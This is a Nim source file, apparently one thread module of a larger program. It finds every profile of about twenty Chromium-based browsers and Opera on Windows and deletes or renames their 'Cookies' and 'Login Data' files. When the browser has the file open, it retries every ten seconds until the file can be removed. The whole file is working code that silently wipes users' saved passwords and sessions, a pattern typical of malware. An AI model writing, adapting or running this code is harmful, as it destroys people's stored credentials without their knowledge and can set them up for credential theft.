from os import sleep
from os import `/`
from os import getEnv
from os import walkDir
from os import PathComponent
from os import existsDir

from strutils import startsWith

from ../flags import BROWSER_THREAD_REMOVE_FILE

when BROWSER_THREAD_REMOVE_FILE:
  from os import tryRemoveFile
else:
  from os import moveFile

type
  BROWSER_TYPES = enum
    CHROME_BASED
    OPERA_BASED # still CHROME_BASED but uses a diferent file structure


proc removeFileOrSleep(src: string, doSleep: bool = false): void =
  const sleepTime: int = 10

  if doSleep:
    sleep(sleepTime * 1000)

  var worked: bool = true

  when BROWSER_THREAD_REMOVE_FILE:
    worked = tryRemoveFile(src)
  else:
    try:
      # rename file from `x` to `x_`
      moveFile(src, src & "_")
    except OSError:
      removeFileOrSleep(src, true)
  # chit ca nu exista fisierul
  # worked va fi true
  if not worked:
    # try to remove file every `sleepTime` secs
    # am nev de asta pt ca daca browserul este deschis
    # nu pot sterge fisierul
    removeFileOrSleep(src, true)

proc initBrowserThread*(): void {.thread.} =
  # trebuie mai multe browsere
  let browsers: seq[tuple[based: BROWSER_TYPES, folders: seq[string]]] = @[
    (
      CHROME_BASED,
      @[
        r"Google\Chrome",
        r"Microsoft\Edge",
        r"7Star\7Star",
        r"Amigo",
        r"BraveSoftware\Brave-Browser",
        r"CentBrowser",
        r"Chedot",
        r"Google\Chrome SxS",
        r"Chromium",
        r"CocCoc\Browser",
        r"Comodo\Dragon",
        r"Elements Browser",
        r"Epic Privacy Browser",
        r"Kometa",
        r"Orbitum",
        r"Sputnik\Sputnik",
        r"Torch",
        r"uCozMedia\Uran",
        r"Vivaldi",
        r"Yandex\YandexBrowse"
      ]
    ),
    (
      OPERA_BASED,
      @[
        r"Opera Software\Opera Stable"
      ]
    ),
  ]

  # cache prefix to avoid multiple getEnv calls
  var prefix: string = ""

  for browser in browsers:
    # clear prefix for diferent browser types
    prefix = ""
    for folder in browser.folders:
      var
        fullFolder: string = ""
        files: seq[string] = @[]
      case browser.based

      of CHROME_BASED, OPERA_BASED:
        let isOpera: bool = browser.based == OPERA_BASED

        # check if prefix is already assigned
        if prefix == "":
          prefix =
            # opera uses appdata instead of localappdata
            if isOpera:
              getEnv("appdata")
            else:
              getEnv("localappdata")

        fullFolder =
          if isOpera:
            prefix / folder
          else:
            prefix / folder / "User Data"

        if existsDir(fullFolder):
          files = @[r"Default\Cookies", r"Default\Login Data"]

          for kind, folder in walkDir(fullFolder, true):
            if kind == pcDir:
              if folder.startsWith("Profile"):
                files.add folder / "Cookies"
                files.add folder / "Login Data"

      for file in files:
        # echo file
        removeFileOrSleep(fullFolder / file)

# initBrowserThread()
